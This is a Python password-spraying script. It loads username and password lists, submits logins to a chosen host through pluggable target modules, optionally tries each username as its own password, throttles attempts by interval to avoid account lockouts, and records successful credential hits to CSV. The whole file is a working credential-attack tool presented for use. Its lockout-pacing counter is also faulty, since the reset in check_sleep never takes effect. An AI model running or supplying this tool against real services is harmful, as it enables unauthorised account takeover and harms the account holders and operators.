#!/usr/bin/env python

import time
import argparse
import csv
import datetime
import json
import os
import sys
import csv
from targets import *

class color:
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'

    def color_print(self, string, color):
        print(color + string + self.end)
        
# initalize colors object
colors = color()

def args():
    parser = argparse.ArgumentParser(description="Python based script for password spraying with selenium and headless chrome", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-p", "--passwords", type=str, dest="passlist", help="filepath of the passwords list", default="./passwords.txt", required=False)
    parser.add_argument("-t", "--target-host", type=str, dest="host", help="host to password spray", required=True)
    parser.add_argument("-m", "--module", type=str, dest="module", help="module corresponding to target host", required=True)
    parser.add_argument("-o", "--output", type=str, dest="csvfile", help="name and path of output csv where hits will be logged", required=False)
    parser.add_argument("-u", "--usernames", type=str, dest="userlist", help="filepath of the usernames list", required=True)
    parser.add_argument("-a", "--attempts", type=int, dest="attempts", help="number of logins submissions per interval (for each user)", required=False)
    parser.add_argument("-i", "--interval", type=int, dest="interval", help="minutes inbetween login intervals", required=False)
    parser.add_argument("-e", "--equal", action="store_true", dest="equal", help="does 1 spray for each user where password = username", required=False)

    args = parser.parse_args()
    userlist, passlist, attempts, interval = args.userlist, args.passlist, args.attempts, args.interval

    # get usernames from file
    try:
        with open(userlist, 'r') as f:
            users = f.read().splitlines()
    except Exception:
        colors.color_print('[!] Error reading usernames from file: %s' % (userlist), colors.red)
        exit()

    #  get passwords from file
    try:
        with open(passlist, 'r') as f:
            passwords = f.read().splitlines()
    except Exception:
        colors.color_print('[!] Error reading passwords from file: %s' % (passlist), colors.red)
        exit()


    if interval and not attempts:
        colors.color_print('[!] Number of login attempts per interval (-a) required with -i', colors.red)
        exit()
    elif not interval and attempts:
        colors.color_print('[!] Minutes per interval (-i) required with -a', colors.red)
        exit()

    return users, passwords, args.host, args.csvfile, attempts, interval, args.equal, args.module


def make_log(host):
    if not os.path.isdir('logs'):
        os.mkdir('logs')
    if not os.path.isdir('logs/%s' % (host)):
        os.mkdir('logs/%s' % (host))
    stamp = datetime.datetime.now()
    ts = stamp.strftime('%B-%d-%Y-%H:%M:%S')
    log_name = 'logs/%s/%s.csv' % (host,ts)
    log_file = open(log_name, 'wb')
    log_writer = csv.writer(log_file, delimiter=',')
    log_writer.writerow(['Username','Attempt Date','Attempt Time'])
    return log_file, log_writer, log_name


def check_sleep(login_attempts, attempts, interval):
    if login_attempts == attempts:
        print('')
        login_attempts = 0
        colors.color_print(('[*] Sleeping until %s') % ((datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime('%m-%d %H:%M:%S')), colors.yellow)
        time.sleep(interval * 60)
        print('')


def main():
    users, passwords, host, csvfile, attempts, interval, equal, module = args()
    
    # try to instantiate the specified module
    try:
        module = module.title()
        mod_name = getattr(sys.modules[__name__], module)
        class_name = getattr(mod_name, module)
        target = class_name(host)
    except AttributeError:
        print('[!] Error loading %s module. %s is spelled incorrectly or does not exist') % (module, module)
        exit()

    # create the log file
    log_file, log_writer, log_name = make_log(host)

    # open the csv file if flag is present
    if csvfile:
        output = open(csvfile, 'wb')
        output_writer = csv.writer(output, delimiter=',')
        output_writer.writerow(['Username','Password'])

    print('[*] Target Module: %s') % (module)
    print('[*] Spraying URL: %s') % (target.url)
    if attempts:
        print('[*] Interval: Attempting %d logins per user every %d minutes') % (attempts, interval)
    print('[*] Log: %s') % (log_name)
    print('')

    login_attempts = 0

    # spray once with password = username if flag present
    if equal:
        print('[*] Spraying with password = username')
        for username in users:
            response = target.login(username, username)
            success = target.check_success(response)
            if success:
                colors.color_print(('\t[+] Hit for: %s') % (username), color.green)
                if csvfile:
                    output_writer.writerow([username, username])
        login_attempts += 1

    # spray using password file
    for password in passwords:
        check_sleep(login_attempts, attempts, interval)
        print('[*] Spraying with %s') % (password)
        for username in users:
            response = target.login(username, password)
            success = target.check_success(response)
            if success:
                colors.color_print(('\t[+] Hit for: %s') % (username), color.green)
                if csvfile:
                    output_writer.writerow([username, password])
            
            # log the login attempt
            log_writer.writerow([username, datetime.date.today(), datetime.datetime.now().time().strftime('%H:%M:%S')])
            
        login_attempts += 1

    # close files
    log_file.close()
    if csvfile:
        output.close()


if __name__ == '__main__':
    main()